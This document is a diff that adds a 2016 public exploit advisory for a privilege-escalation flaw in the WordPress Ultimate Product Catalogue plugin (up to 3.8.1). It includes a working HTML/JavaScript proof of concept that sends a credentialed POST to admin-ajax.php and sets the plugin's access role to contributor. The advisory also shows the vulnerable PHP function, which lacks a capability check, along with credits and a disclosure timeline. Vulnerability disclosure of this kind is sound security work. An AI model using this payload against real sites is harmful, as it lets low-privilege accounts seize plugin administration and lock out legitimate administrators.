@@ -1,0 +1,114 @@
+<!--
+# Exploit Title: Wordpress Ultimate-Product-Catalog <=3.8.1 Privilege escalation
+# Date: 2016-06-17
+# Google Dork: Index of /wp-content/plugins/ultimate-product-catalogue/
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Vendor Homepage: http://www.etoilewebdesign.com
+# plugin uri: http://www.etoilewebdesign.com/plugins/ultimate-product-catalog/
+# Software Link: 
+# Version: 3.8.1
+# Tested on: windows 7 + Mozilla firefox. 
+# Demo: https://www.youtube.com/watch?v=m_qMZ2wIQPI
+
+====================
+ DESCRIPTION
+====================
+
+In a recent security research, a privilege scalation web vulnerability has been detected in the WordPress Ultimate Product Catalogue Plugin <=v3.8.1.
+The vulnerability allows remote attackers to take over control of the Ultimate Product Catalogue Plugin administration page if the plugin ispremium version and the remote attacker have an especific account (contributor|editor|author).
+The privilege scalation web vulnerability is located in the <upc-plugin-path>/Functions/Update_Admin-Databases.php` file.
+Remote attackers are able to request crafted data of the POST method request with the vulnerable ´acces_role´ parameter.
+
+The security risk of the privilege scalation web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 8.6.
+Exploitation of the privilege scalation vulnerability requires low user interaction and low privilege web-application user account.
+Successful exploitation of the privilege scalation web vulnerability results in web aplication compromise.
+
+For security demostration I made a prof of concept to show the vulnerability logged in as a contributor user.
+
+==============
+ POC (html)
+==============
+-->
+
+<html>
+
+  <body>
+    <script>
+      function submitRequest()
+      {
+      	var access_role = "contributor"; //this is my type of profile (contributor|editor|author) to full admin acces!!
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/wordpress/wp-admin/admin-ajax.php?action=UPCP-options&Action=UPCP_UpdateOptions", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.setRequestHeader("Accept-Language", "es-ES,es;q=0.8");
+        xhr.withCredentials = true;
+        var body = "color_scheme=Blue&product_links=Same&read_more=Yes&desc_count=240&sidebar_order=Normal&Details_Image=http%3A%2F%2F&filter_type=AJAX&case_insensitive_search=Yes&tag_logic=AND&product_search=name&contents_filter=Yes&maintain_filtering=Yes&Socialmedia%5B%5D=Blank&custom_product_page=No&product_inquiry_form=No&product_reviews=No&lightbox=No&products_per_page=1000000&pagination_location=Top&product_sort=Price_Name&cf_converion=No&access_role="+access_role
+        +"&pretty_links=No&xml_sitemap_url=&seo_option=None&seo_integration=Add&seo_title=%5Bpage-title%5D+%7C+%5Bproduct-name%5D&categories_label=&subcategories_label=&tags_label=&custom_fields_label=&sort_by_label=&price_ascending_label=&price_descending_label=&name_ascending_label=&name_descending_label=&product_name_search_label=&product_name_text_label=&details_label=&back_to_catalogue=&no_results_found_label=&products_pagination_label=&product_details_label=&additional_info_label=&contact_us_label=&related_products_label=&next_product_label=&previous_product_label=&Options_Submit=Save+Changes";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="I want more privileges!!" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+<!--
+================
+ Vulnerable code
+================
+located in <upc-plugin-path>/Functions/Update_Admin-Databases.php` file
+
+
+function Update_UPCP_Options() {
+	global $Full_Version;
+	$InstallVersion = get_option("UPCP_First_Install_Version");
+	...
+
+	if ($Full_Version == "Yes" and isset($_POST['access_role'])) {update_option("UPCP_Access_Role", $_POST['access_role']);}
+	...
+	
+	$update = __("Options have been succesfully updated.", 'UPCP');
+	return $update;
+}
+
+the function no check for capabilities...
+
+==========
+ CREDITS
+==========
+
+Vulnerability discovered by:
+	Joaquin Ramirez Martinez [i0akiN SEC-LABORATORY]
+	joaquin.ramirez.mtz.lab[at]gmail[dot]com
+	https://www.facebook.com/I0-security-lab-524954460988147/
+	https://www.youtube.com/channel/UCe1Ex2Y0wD71I_cet-Wsu7Q
+
+============
+ REFERENCES
+============
+	https://i0akinsec.wordpress.com/2016/06/17/wordpress-ultimate-product-catalog-3-8-1-privilege-escalation/
+	http://www.etoilewebdesign.com/plugins/ultimate-product-catalog/
+	https://wordpress.org/plugins/ultimate-product-catalogue/
+	https://wordpress.org/plugins/ultimate-product-catalogue/changelog/
+	
+
+Note: The vulnerability can be exploited if the plugin is in full version.
+      An attacker without any account, but the administration menu item only appear when the attacker
+      account is contributor, editor or author. When the legitimate UPCP administrator want request the plugin administration page, it will
+      denegate his access.
+
+==================================
+
+time-line
+
+2015-10-08: vulnerability found
+2016-06-17: reported to vendor
+2016-06-17: Vendor has realeased a new version (3.8.)
+2016-06-18: Public disclousure
+===================================
+-->
